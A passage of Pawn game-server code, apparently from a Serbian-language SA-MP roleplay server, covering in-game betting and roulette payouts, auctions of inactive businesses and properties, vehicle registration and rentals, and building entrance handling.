		        case 0..3:
		        {
					if(Kockanje[playerid][TimKlad] == 1)
					{
						new kladnagrada = (Kockanje[playerid][UlogKlad]*3)+random(10000);
						SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s osvaja $%d na Crvenu Zvezdu.", ImeIgraca( playerid ), kladnagrada);
				        SCMF(playerid, 0x72B8D8FF, "(KLADIONICA): CESTITAMO!!! Osvojili ste {FFFFFF}($%d) {82B8D8}na {FFFFFF}'Crvenu Zvezdu'.", kladnagrada);
				        DajIgracuNovac( playerid, kladnagrada );
					}
				    else
					{
						SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s nije osvojio/la nista jer je Crvena Zvezda pobedila.", ImeIgraca( playerid ));
				        SendClientMessage(playerid, 0x72B8D8FF, "(KLADIONICA): Nazalost, niste osvojili nista jer je {FFFFFF}'Crvena Zvezda' {72B8D8}pobedila.");
					}

					Kockanje[playerid][IgraKlad] = false;
		    	}
		    	case 4..6:
		        {
					if(Kockanje[playerid][TimKlad] == 2)
					{
						new kladnagrada = (Kockanje[playerid][UlogKlad]*3) + random(10000);
						SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s osvaja $%d jer su Partizan i Crvena Zvezda igrali nereseno.", ImeIgraca( playerid ), kladnagrada);
				        SCMF(playerid, 0x72B8D8FF, "(KLADIONICA): CESTITAMO!!! Osvojili ste {FFFFFF}($%d) {82B8D8}jer su klubovi igrali {FFFFFF}'nereseno'.", kladnagrada);
				        DajIgracuNovac( playerid, kladnagrada );
					}
				    else
					{
						SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s nije osvojio/la nista jer su Partizan i CZ igrali nereseno.", ImeIgraca( playerid ));
				        SendClientMessage(playerid, 0x72B8D8FF, "(KLADIONICA): Nazalost, niste osvojili nista jer klubovi su igrali {FFFFFF}'nereseno'.");
					}

					Kockanje[playerid][IgraKlad] = false;
				}
		    	case 7..9:
		        {
					if(Kockanje[playerid][TimKlad] == 3)
					{
						new kladnagrada = (Kockanje[playerid][UlogKlad]*3) + random(10000);
						SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s osvaja $%d na Partizan.", ImeIgraca( playerid ), kladnagrada);
				        SCMF(playerid, 0x72B8D8FF, "(KLADIONICA): CESTITAMO!!! Osvojili ste {FFFFFF}($%d) {82B8D8}na {FFFFFF}'Partizan'.", kladnagrada);
				        DajIgracuNovac( playerid, kladnagrada );
					}
				    else
					{
						SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s nije osvojio/la nista jer je Partizan pobedio.", ImeIgraca( playerid ));
				        SendClientMessage(playerid, 0x72B8D8FF, "(KLADIONICA): Nazalost, niste osvojili nista jer je {FFFFFF}'Partizan' {72B8D8}pobedio.");
					}

					Kockanje[playerid][IgraKlad] = false;
				}
			}
		}

		if(Kockanje[playerid][IgraRulet])
		{
			if(Kockanje[playerid][BrojRulet] == randomruletid)
			{
				new ruletnagrada = (Kockanje[playerid][UlogRulet]*20)+random(100000);
				SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s osvaja $%d na broju %d.", ImeIgraca( playerid ), ruletnagrada, Kockanje[playerid][BrojRulet]);
			   	SCMF(playerid, 0x72B8D8FF, "(RULET): CESTITAMO!!! Osvojili ste {FFFFFF}($%d) {82B8D8}na broj {FFFFFF}(%d).", ruletnagrada, Kockanje[playerid][BrojRulet]);
			    DajIgracuNovac( playerid, ruletnagrada );
			}
			else
			{
				SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s nije osvojio/la nista, kuglica se zaustavila na broju %d.", ImeIgraca( playerid ), randomruletid);
			    SCMF(playerid, 0x72B8D8FF, "(RULET): Nazalost, niste osvojili nista, kuglica se zaustavila na broju {FFFFFF}(%d).", randomruletid);
			}

			Kockanje[playerid][IgraRulet] = false;
		}
	}
	return 1;
}

_:public RandomPoruke()
{
	new str[128];
	format(str, 128, "%s", RandomSPoruke[ random(sizeof(RandomSPoruke)) ]);

	foreach(new i : Player) 
	{
		PlayerTextDrawSetString(i, Ingame_pTD[i][35], str);
		if(!TogHud[i] && PlayerLogged[i] && Spectate[i] == -1) PlayerTextDrawShow(i, Ingame_pTD[i][35]);
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public neaktivnostFirmi()
{
	new done = false;
	foreach(new b : iter_Bizz)
	{
		done = false;

	    if( BusinessInfo[ b ][ b_ID ] > 0 && BusinessInfo[ b ][ bOwnerOrg ] == -1 )
		{
			if( BusinessInfo[ b ][ bOwner_sqlID ] != -1 )
			{
				BusinessInfo[ b ][ bNeaktivnost ]++;
	            BusinessInfo[ b ][ bFacture ]--;

				if( BusinessInfo[ b ][ bNeaktivnost ] >= 500 )
				{
					WriteLog("log-neaktivnost", "FirmaID: %d | Prodana zbog neaktivnosti vlasnika %s", b, BusinessInfo[ b ][ bOwner ]);

				    BusinessInfo[ b ][ bOwner_sqlID ] = -1;
				    BusinessInfo[ b ][ bOnAuction ] = true;
				    BusinessInfo[ b ][ bNeaktivnost ] = 0;
				    BusinessInfo[ b ][ bFacture ] = 100;
		    		strmid( BusinessInfo[ b ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);

					new q[ 200 ];
					mysql_format(mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOnAuction` = '1', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
														BusinessInfo[ b ][ bOwner_sqlID ],
														BusinessInfo[ b ][ bOwner ],
														BusinessInfo[ b ][ bNeaktivnost ],
														BusinessInfo[ b ][ bFacture ], BusinessInfo[ b ][ b_ID ] );

			   		mysql_tquery(mSQL, q);

		   			done = true;
				}

				if( BusinessInfo[ b ][ bFacture ] <= 0 )
				{
					WriteLog("log-fakture", "FirmaID: %d | Prodana zbog nedostatka faktura %s", b, BusinessInfo[ b ][ bOwner ]);

				    BusinessInfo[ b ][ bOwner_sqlID ] = 0;
				    BusinessInfo[ b ][ bOnAuction ] = true;
				    BusinessInfo[ b ][ bNeaktivnost ] = 0;
				    BusinessInfo[ b ][ bFacture ] = 100;
		    		strmid( BusinessInfo[ b ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);

				    new q[ 200 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOnAuction` = '1', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
														BusinessInfo[ b ][ bOwner_sqlID ],
														BusinessInfo[ b ][ bOwner ],
														BusinessInfo[ b ][ bNeaktivnost ],
														BusinessInfo[ b ][ bFacture ], BusinessInfo[ b ][ b_ID ] );

			   		mysql_tquery( mSQL, q);

		   			done = true;
				}

				if(!done)
				{
				    new q[ 200 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
														BusinessInfo[ b ][ bNeaktivnost ],
														BusinessInfo[ b ][ bFacture ], BusinessInfo[ b ][ b_ID ] );

			   		mysql_tquery( mSQL, q );
				}

				Bussines_Refresh( b );
			}
		}
	}
	return 1;
}

_:public neaktivnostImovine()
{
	foreach(new i : iter_Imovina)
	{
		if( II[i][iSQLID] != 0 )
		{
			if( II[ i ][ iOwned ] == 1 && II[i][iOwnerSQLID] != -1 )
			{
				II[ i ][ iNeaktivnost ]++;
				if( II[ i ][ iNeaktivnost ] >= 500 )
				{
					WriteLog("log-neaktivnost", "ImovinaID: %d | Prodana zbog neaktivnosti vlasnika %s.", i, II[ i ][ iOwner ]);

			    	II[ i ][ iOwned ] = 0;
			    	II[ i ][ iOnAuction ] = true;
			    	II[ i ][ iOwnerSQLID ] = -1;
			    	II[ i ][ iNeaktivnost ] = 0;
					strmid( II[ i ][ iOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
				}
				SaveProperty( i );
				PropertyRefresh( i );
			}
			else
			{
		    	II[i][iOwned] = 0;
		    	II[i][iOwnerSQLID] = -1;
		    	SaveProperty(i);
		    	PropertyRefresh(i);
			}
		}
	}
    return 1;
}

_:public registracijaVozila()
{
	for(new c, i = GetVehiclePoolSize(); c <= i; c++)
	{
		if( VehicleInfo[ c ][ vSqlID ] != 0 )
		{
			if( VehicleInfo[ c ][ vUsage ] == PRIVATNO_VOZILO && VehicleInfo[ c ][ vOwner_sqlID ] != 0 )
			{
		        VehicleInfo[ c ][ vRegVreme ]--;
		        if( VehicleInfo[ c ][ vRegVreme ] == 0 )
				{
			    	VehicleInfo[ c ][ vReg ] = 0;
					VehicleInfo[ c ][ vTeh ] = 0;
				}
				if( VehicleInfo[ c ][ vRegVreme ] == -100 )
				{
					WriteLog("log-sell", "Vozilo %d je obrisano zbog registracije od -100h.", c);

		    		sql_vehicles_delete( c );
		    		ResetVehicle( c );
					SMG_DestroyVehicle( c );
				}
			}
		}
	}
    return 1;
}
//------------------------------------------------------------------------------
_:public KrajRenta( playerid )
{
    KillTimer(RentTimer[ playerid ]);
	VehicleObjectCheck( RentVozilo[ playerid ] );
	VehicleInfo[RentVozilo[playerid]][Validv3DText] = false;
    DestroyDynamic3DTextLabel(VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ]);
    ResetVehicle( RentVozilo[ playerid ] );
	SMG_DestroyVehicle( RentVozilo[ playerid ] );
	RentVozilo[ playerid ] = -1;

	SendClientMessage( playerid, ZUTA, "(RENT): Isteklo je vreme za rentano vozilo te je vraceno.");
	return 1;
}
//------------------------------------------------------------------------------
_:public SMG_SetSpawnInfo(playerid) 
{
	new rand = random( sizeof( SpawnAerodrom ) );
    SetSpawnInfo(playerid, 0, PlayerInfo[playerid][xSkin], SpawnAerodrom[ rand ][ 0 ], SpawnAerodrom[ rand ][ 1 ], SpawnAerodrom[ rand ][ 2 ], 0.0000, 0, 0, 0, 0, 0, 0);
	return 1;
}
//------------------------------------------------------------------------------
_:public SMG_AttachTrailerToVehicle( trailerid, vehicleid )
{
	LastPullingVehicle[ trailerid ] = vehicleid;
	return AttachTrailerToVehicle( trailerid, vehicleid );
}
//------------------------------------------------------------------------------
_:public SMG_SetVehiclePos( vehicleid, Float:x, Float:y, Float:z )
{
	if( vehicleid != IVI )
	{
	    if( SetVehiclePos( vehicleid, x, y, z ) )
		{
	        RealVehiclePositions[ vehicleid ][ 0 ] = x;
			RealVehiclePositions[ vehicleid ][ 1 ] = y;
			RealVehiclePositions[ vehicleid ][ 2 ] = z;
			return 1;
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public checkOrgEntrance( playerid, OrgID )
{
    if( org_info[ OrgID ][ oEntFromBussines ] != -1 )
	{
		SetPlayerInterior( playerid, org_info[ OrgID ][ oEntInt ] );
		SetPlayerVirtualWorld( playerid, org_info[ OrgID ][ oEntVw ] );

		uFirmi[ playerid ] = org_info[ OrgID ][ oEntFromBussines ];
		SetPlayerTime( playerid, 12, 0 );
	}
	else
	{
	    SetPlayerInterior( playerid, 0 );
		SetPlayerVirtualWorld( playerid, 0 );
		SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );
	}
}
//------------------------------------------------------------------------------
_:public UlazIzlaz( playerid )
{
	new entrance_finded = false;

    new entrance[ MAX_ORG ];
	for( new i = 1; i < MAX_ORG; i++ )
	{
	    entrance[ i ] = true;

		if( IsPlayerInRangeOfPoint( playerid, 2.0, org_info[ i ][ oPozExtX ], org_info[ i ][ oPozExtY ], org_info[ i ][ oPozExtZ ] ) )
		{
			if( org_info[ i ][ oEntFromBussines ] != -1 )
			{
			    if( GetPlayerVirtualWorld( playerid ) == org_info[ i ][ oEntVw ] && GetPlayerInterior( playerid ) == org_info[ i ][ oEntInt ] ) 
			    {
					entrance[ i ] = true;
				}
				else entrance[ i ] = false;
			}
			else entrance[ i ] = true;

			if( org_info[ i ][ oTip ] == ORG_TIP_VLADINA )
			{
				SMG_SetPlayerPos( playerid, org_info[ i ][ oPozIntX ], org_info[ i ][ oPozIntY ], org_info[ i ][ oPozIntZ ] );
			  	UcitajObjekte( playerid );
			   	SetCameraBehindPlayer( playerid );
			   	SetPlayerInterior( playerid, org_info[ i ][ oInt ] );
				SetPlayerVirtualWorld( playerid, org_info[ i ][ oVw ] );
				SetPlayerTime( playerid, 12, 0 );
				inOrgInt[ playerid ] = i;
				entrance_finded = true;
				break;
			}
			else
			{
			    if( entrance[ i ] )
				{
					if( PlayerInfo[ playerid ][ xClan ] == i || PlayerInfo[ playerid ][ xAdmin ] >= 6 )
					{
						SMG_SetPlayerPos( playerid, org_info[ i ][ oPozIntX ], org_info[ i ][ oPozIntY ], org_info[ i ][ oPozIntZ ] );
				  		UcitajObjekte( playerid );
						SetPlayerTime( playerid, 12, 0 );
					    SetCameraBehindPlayer( playerid );
				    	SetPlayerInterior( playerid, org_info[ i ][ oInt ] );
						SetPlayerVirtualWorld( playerid, org_info[ i ][ oVw ] );
						inOrgInt[ playerid ] = i;
						entrance_finded = true;
						break;
					}
					else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
				}
			}
		}
		else if( IsPlayerInRangeOfPoint( playerid, 2.0, org_info[ i ][ oPozIntX ], org_info[ i ][ oPozIntY ], org_info[ i ][ oPozIntZ ] ) && GetPlayerVirtualWorld( playerid ) == org_info[ i ][ oVw ] )
		{
		    SMG_SetPlayerPos( playerid, org_info[ i ][ oPozExtX ], org_info[ i ][ oPozExtY ], org_info[ i ][ oPozExtZ ] );
		    UcitajObjekte( playerid );
	        SetCameraBehindPlayer( playerid );
			inOrgInt[ playerid ] = -1;

			checkOrgEntrance( playerid, i );
			entrance_finded = true;
			break;
		}
	}
	if( !entrance_finded )
	{
		foreach(new i : iter_Imovina)
		{
			if( IsPlayerInRangeOfPoint( playerid, 2.0, II[ i ][ iEnter ][ 0 ], II[ i ][ iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] ) )
			{
			    if( II[ i ][ iLocked ] == 0 )
				{
					SMG_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
			  		UcitajObjekte( playerid );
				    SetCameraBehindPlayer( playerid );
			    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
					SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
					SetPlayerTime( playerid, 12, 0 );
					inProperty[ playerid ] = i;

					entrance_finded = true;
					break;
				}
				else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
			}
			else if( IsPlayerInRangeOfPoint( playerid, 2.0, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == II[ i ][ iVW ] )
			{
			    SMG_SetPlayerPos( playerid, II[ i ][ iEnter ][ 0 ], II[ i ][ iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] );
			    UcitajObjekte( playerid );
		        SetCameraBehindPlayer( playerid );
				SetPlayerInterior( playerid, 0);
				SetPlayerVirtualWorld( playerid, 0);
				SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );
				inProperty[ playerid ] = -1;

				entrance_finded = true;
				break;
			}
		}
	}
	if( !entrance_finded ) 
	{
		foreach(new f : iter_Bizz) 
		{
			if( IsPlayerInRangeOfPoint( playerid, 1.0, BusinessInfo[ f ][ bEnterX], BusinessInfo[ f ][ bEnterY], BusinessInfo[ f ][ bEnterZ] ) ) 
			{
	            /*if( BusinessInfo[ f ][ bOwnerOrg ] != -1 ) 
	            {
	                if( BusinessInfo[ f ][ bOwnerOrg ] == PlayerInfo[ playerid ][ xClan ] && BusinessInfo[ f ][ bLocked ] == 1 ) { }
	                else return SendErrorMessage( playerid, "Ova firma je zakljucana!" );
	            }
				else 
				{*/
				if( BusinessInfo[ f ][ bLocked ] == 1 ) return SendErrorMessage( playerid, "Ova firma je zakljucana!" );
			    else if( BusinessInfo[ f ][ bType ] == VRSTA_TRAFIKA ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
		        else if( BusinessInfo[ f ][ bType ] == VRSTA_POSAO ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
		        else if( BusinessInfo[ f ][ bType ] == VRSTA_RENT ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
		        else if( BusinessInfo[ f ][ bType ] == VRSTA_OGLAS ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
		        else if( BusinessInfo[ f ][ bType ] == VRSTA_LUTRIJA ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
				//}

				SMG_SetPlayerPos( playerid, BusinessInfo[ f ][ bExitX], BusinessInfo[ f ][ bExitY ], BusinessInfo[ f ][ bExitZ ] );
	            UcitajObjekte( playerid );
			    SetCameraBehindPlayer( playerid );
				SetPlayerInterior( playerid, BusinessInfo[ f ][ bInInt ] );
				SetPlayerVirtualWorld( playerid, BusinessInfo[ f ][ bInVW ] );
			    uFirmi[ playerid ] = f;

				if( BusinessInfo[ f ][ bType ] == VRSTA_MARKET ) 
				{
				    if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_MAIN ) ) return SendErrorMessage( playerid, "Ne mozete uci sa objektom u desnoj ruci.");

					SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s desnom rukom uzima korpu za kupovinu.", ImeIgraca( playerid ));
					SetPlayerAttachedObject( playerid, OBJECT_SLOT_MAIN, 19592, 6, 0.08, -0.12, -0.07, -54.0, -95.0, 15.0, 1.00, 1.00, 1.00 );
					SendUsageMessage( playerid, "/ubaci [opcija] || /izbaci [opcija]");
				}

				if( BusinessInfo[ f ][ bType ] == VRSTA_JAVNAK ) SetPlayerTime( playerid, 20, 0 );
				else SetPlayerTime( playerid, 12, 0 );

				entrance_finded = true;
				break;
			}
			else if( IsPlayerInRangeOfPoint( playerid, 2.0, BusinessInfo[ f ][ bExitX ], BusinessInfo[ f ][ bExitY ], BusinessInfo[ f ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BusinessInfo[ f ][ bInVW ] ) {

			    if( BusinessInfo[ f ][ bType ] == VRSTA_MARKET ) 
			    {
	                UzeoIzMarketa[ playerid ][ 0 ] = 0;
				    UzeoIzMarketa[ playerid ][ 1 ] = 0;
				    UzeoIzMarketa[ playerid ][ 2 ] = 0;
				    UzeoIzMarketa[ playerid ][ 3 ] = 0;
				    UzeoIzMarketa[ playerid ][ 4 ] = 0;
				    UzeoIzMarketa[ playerid ][ 5 ] = 0;
				    UzeoIzMarketa[ playerid ][ 6 ] = 0;
				    UzeoIzMarketa[ playerid ][ 7 ] = 0;
				    UzeoIzMarketa[ playerid ][ 8 ] = 0;
				    UzeoIzMarketa[ playerid ][ 9 ] = 0;
				    UkupnaCena[ playerid ] = 0;
					RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MAIN );
				}

				SMG_SetPlayerPos( playerid, BusinessInfo[ f ][ bEnterX ], BusinessInfo[ f ][ bEnterY ], BusinessInfo[ f ][ bEnterZ ] );

				// edit UcitajObjekte( playerid );
	            SMG_TogglePlayerControllable( playerid, false );
				SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);

				SetCameraBehindPlayer( playerid );
				SetPlayerInterior( playerid, BusinessInfo[ f ][ bInt ] );
			    SetPlayerVirtualWorld( playerid, BusinessInfo[ f ][ bVW ] );
			    uFirmi[ playerid ] = -1;
			    SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );

				entrance_finded = true;
				break;
			}
		}
	}
	if( !entrance_finded )
	{
		for( new i = 0; i < MAX_INTERIJERA; i++)
		{
			if( IsPlayerInRangeOfPoint( playerid, 1.5, interior_info[ i ][ int_Enter ][ 0 ], interior_info[ i ][ int_Enter ][ 1 ], interior_info[ i ][ int_Enter ][ 2 ] ) 
				&& GetPlayerVirtualWorld( playerid ) == interior_info[ i ][ int_VwEnter ] && !IsPlayerInAnyVehicle( playerid ))
			{
				UcitajObjekte(playerid);
   				//Streamer_UpdateEx( playerid, interior_info[ i ][ int_Exit ][ 0 ], interior_info[ i ][ int_Exit ][ 1 ], interior_info[ i ][ int_Exit ][ 2 ], interior_info[ i ][ int_VwExit ], interior_info[ i ][ int_IntExit ] );
				SetPlayerFacingAngle( playerid, interior_info[ i ][ int_Exit ][ 3 ] );
				SetPlayerInterior( playerid, interior_info[ i ][ int_IntExit ] );
				SetPlayerVirtualWorld( playerid, interior_info[ i ][ int_VwExit ] );
				SMG_SetPlayerPos( playerid, interior_info[ i ][ int_Exit ][ 0 ], interior_info[ i ][ int_Exit ][ 1 ], interior_info[ i ][ int_Exit ][ 2 ], (Interiors[0] != i ? true : false));

				SetPlayerTime( playerid, 12, 0 );
			    uInterijeru[ playerid ] = i;

				entrance_finded = true;
			    break;
			}
			else if( IsPlayerInRangeOfPoint( playerid, 1.5, interior_info[ i ][ int_Exit ][ 0 ], interior_info[ i ][ int_Exit ][ 1 ], interior_info[ i ][ int_Exit ][ 2 ] ) )
			{
			    UcitajObjekte( playerid );
			    //Streamer_UpdateEx( playerid, interior_info[ i ][ int_Enter ][ 0 ], interior_info[ i ][ int_Enter ][ 1 ], interior_info[ i ][ int_Enter ][ 2 ], interior_info[ i ][ int_VwEnter ], interior_info[ i ][ int_IntEnter ] );
				SetPlayerVirtualWorld( playerid, interior_info[ i ][ int_VwEnter ] );
				SetPlayerInterior( playerid, interior_info[ i ][ int_IntEnter ] );
			    SMG_SetPlayerPos( playerid, interior_info[ i ][ int_Enter ][ 0 ], interior_info[ i ][ int_Enter ][ 1 ], interior_info[ i ][ int_Enter ][ 2 ]);
			    SetPlayerFacingAngle( playerid, interior_info[ i ][ int_Enter ][ 3 ] );
				SetCameraBehindPlayer( playerid );
				SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );
				uInterijeru[ playerid ] = -1;

				entrance_finded = true;
				break;
			}
	    }
    }
    if( !entrance_finded )
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 1456.7057,-1010.1188,26.8438) || IsPlayerInRangeOfPoint(playerid, 2.0, 1467.7717,-1010.1223,26.8438)) // BANKA ULAZ
		{
			UcitajObjekte(playerid);
			SetPlayerFacingAngle(playerid, 90.0);
			SetPlayerInterior(playerid, 1);
			SetPlayerVirtualWorld(playerid, 96);
			if(IsPlayerInRangeOfPoint(playerid, 2.0, 1456.7057,-1010.1188,26.8438)) SMG_SetPlayerPos(playerid, 1370.7448,-38.1494,1000.9133, .safePort = false);
			else SMG_SetPlayerPos(playerid, 1373.8276,-38.1484,1000.9133, .safePort = false);
			SetPlayerTime(playerid, 12, 0);
			
			antiCheatCS[playerid][SpamBanka] = false;
			uInterijeru[playerid] = 187;
			entrance_finded = true;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1370.7448,-38.1494,1000.9133) || IsPlayerInRangeOfPoint(playerid, 2.0, 1373.8276,-38.1484,1000.9133)) // BANKA IZLAZ
		{
			UcitajObjekte(playerid);
			SetPlayerFacingAngle(playerid, 90.0);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			if(IsPlayerInRangeOfPoint(playerid, 2.0, 1370.7448,-38.1494,1000.9133)) SMG_SetPlayerPos(playerid, 1456.7212,-1010.1193,26.8438, .safePort = false);
			else SMG_SetPlayerPos(playerid, 1467.7717,-1010.1223,26.8438, .safePort = false);
			SetPlayerTime(playerid, ServerInfo[VremeInGame], 0);
			    
			antiCheatCS[playerid][SpamBanka] = false;
			uInterijeru[playerid] = -1;
			entrance_finded = true;
		}
		if( IsPlayerInRangeOfPoint( playerid, 1.5, 1359.5321,1064.9854,1626.4896 ) )  // PD KROV
		{
	 	    if( GetFactionType( playerid ) == ORG_TIP_VLADINA ) 
	 	    {
				SetCameraBehindPlayer( playerid );
		        UcitajObjekte( playerid );
			    SetPlayerInterior( playerid, 0 );
		    	SetPlayerVirtualWorld( playerid, 0 );
		      	SMG_SetPlayerPos( playerid, 1558.0685,-1675.5160,28.3955 );
			}
		}
		if( IsPlayerInRangeOfPoint(playerid, 1.5, 1558.0685,-1675.5160,28.3955 ) ) // PD KROV
		{
		    if( GetFactionType( playerid ) == ORG_TIP_VLADINA ) 
		    {
			    SetCameraBehindPlayer(playerid);
		        UcitajObjekte( playerid );
			    SetPlayerInterior( playerid, 3 );
		     	SetPlayerVirtualWorld( playerid, 3 );
		      	SMG_SetPlayerPos( playerid, 1359.5321,1064.9854,1626.4896 );
	      	}
		}
		if( IsPlayerInRangeOfPoint( playerid, 1.5, 1533.1113, -1736.2327, -64.0829 ) )  // PD GARAZA
		{
		    if( GetFactionType( playerid ) == ORG_TIP_VLADINA ) 
		    {
				SetCameraBehindPlayer( playerid );
		        UcitajObjekte( playerid );
			    SetPlayerInterior( playerid, 0 );
		    	SetPlayerVirtualWorld( playerid, 0 );
		      	SMG_SetPlayerPos( playerid, 1524.4833, -1677.7874, 6.2188 );
			}
		}
		if( IsPlayerInRangeOfPoint(playerid, 1.5, 1524.4833, -1677.7874, 6.2188 ) )  // PD GARAZA
		{
		    if( GetFactionType( playerid ) == ORG_TIP_VLADINA ) 
		    {
			    SetCameraBehindPlayer(playerid);
		        UcitajObjekte( playerid );
			    SetPlayerInterior( playerid, 3 );
		     	SetPlayerVirtualWorld( playerid, 3 );
		      	SMG_SetPlayerPos( playerid, 1533.1113, -1736.2327, -64.0829 );
			}
		}

		if( IsPlayerInRangeOfPoint( playerid, 2.0, 1573.0773,-1338.7637,16.4844 ) ) { // za padobran
		    SMG_SetPlayerPos( playerid, 1548.4452,-1364.1462,326.2183  );
		}
		else if( IsPlayerInRangeOfPoint( playerid, 2.0, 1548.4452,-1364.1462,326.2183 ) ) { // za padobran
		    SMG_SetPlayerPos( playerid, 1573.0773,-1338.7637,16.4844  );
		}

		if( IsPlayerInRangeOfPoint( playerid, 1.5, 1462.0800,-1017.8565,48.1406 ) ) { // tajni ulaz PD/SD

	 	    if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
			{
				//SetCameraBehindPlayer( playerid );
		        //UcitajObjekte( playerid );
				Streamer_UpdateEx( playerid, 1629.2180,1341.3995,1059.7301, 1, 0 );
			    SetPlayerInterior( playerid, 1 );
		    	SetPlayerVirtualWorld( playerid, 0 );
		      	SMG_SetPlayerPos( playerid, 1629.2180,1341.3995,1059.7301  );
		      	uInterijeru[ playerid ] = 69;
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public split(const strsrc[], strdest[][], delimiter)
{
	new i, li, aNum, len;
	while(i <= strlen(strsrc))
	{
	    if(strsrc[ i ] == delimiter || i == strlen(strsrc))
		{
	        len = strmid(strdest[aNum], strsrc, li, i, 128);
	        strdest[aNum][len] = 0;
	        li = i+1;
	        aNum++;
		}
		i++;
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public ImmobCountForPlayer(playerid)
{
	if(immobsecounds[playerid] != 0)
	{
	    new immobstring[ 34 ];
	    format( immobstring,sizeof( immobstring ), "~w~Preostalo sekundi: ~g~%d", immobsecounds[playerid]-1);
        GameTextForPlayer( playerid, immobstring, 1500, 4 );
        PlayerPlaySound( playerid, 1056, 0.0, 0.0, 0.0 );

        immobsecounds[playerid]--;

        if(immobsecounds[playerid] == 0)
        {
			KillTimer(immobcounttimer[playerid]);
		}
	}
}
//------------------------------------------------------------------------------
_:public BreakLockCountForPlayer(playerid)
{
	new Float:X, Float:Y, Float:Z;
	GetVehiclePos( BreakingVehicle[playerid], X, Y, Z );
	if(!IsPlayerInRangeOfPoint( playerid, 3.0, X, Y, Z ) )
	{
		SMG_TogglePlayerControllable( playerid, true );

		KillTimer(BreakLockTimer[playerid]);
		KillTimer(breakcounttimer[playerid]);

		BreakLockTimerCalled[playerid] = 0;
		BreakingLock[playerid] = 0;

		SendErrorMessage( playerid, "Vozilo u koje pokusavate provaliti nije blizu vas." );
	}
	if(breaksecounds[playerid] != 0)
	{
	    new breakstring[ 34 ];
	    format( breakstring,sizeof( breakstring ), "~w~Preostalo sekundi: ~g~%d", breaksecounds[playerid]-1 );
        GameTextForPlayer( playerid, breakstring, 1500, 4 );
        PlayerPlaySound( playerid, 1056, 0.0, 0.0, 0.0 );

        breaksecounds[playerid]--;

        if(breaksecounds[playerid] == 0)
        {
			KillTimer(breakcounttimer[playerid]);
		}
	}
}
//------------------------------------------------------------------------------
_:public VehicleBreakLock(playerid, vehicleid)
{
	GameTextForPlayer( playerid, "~w~Vozilo ~g~otkljucano", 5000, 6 );
	PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
	BreakingLock[playerid] = 0;
	VehicleInfo[ vehicleid ][ vLocked ] = 0;
	SMG_TogglePlayerControllable( playerid, true );
	UnLockCar( vehicleid );
}
//------------------------------------------------------------------------------
_:public TrashLimitOff( playerid )
{
    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Otisli ste od kontejnera i niste nasli nista." );
    new rands = random( 4 )+1;
    switch( rands )
	{
        case 1:
		{
            SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* Alat za obijanje je nadjen u kontejneru (( %s ))", ImeIgraca( playerid ) );
			PlayerInfo[ playerid ][ xToolkit ] = 1;
			sql_user_update_integer( playerid, "toolkit", PlayerInfo[ playerid ][ xToolkit ] );
		}
		case 2:
		{
            SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* Upaljac je nadjen u kontejneru (( %s ))", ImeIgraca( playerid ) );
			PlayerInfo[ playerid ][ xUpaljac ] = 1;
		}
		case 3:
		{
            SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* Uze je nadjeno u kontejneru (( %s ))", ImeIgraca( playerid ) );
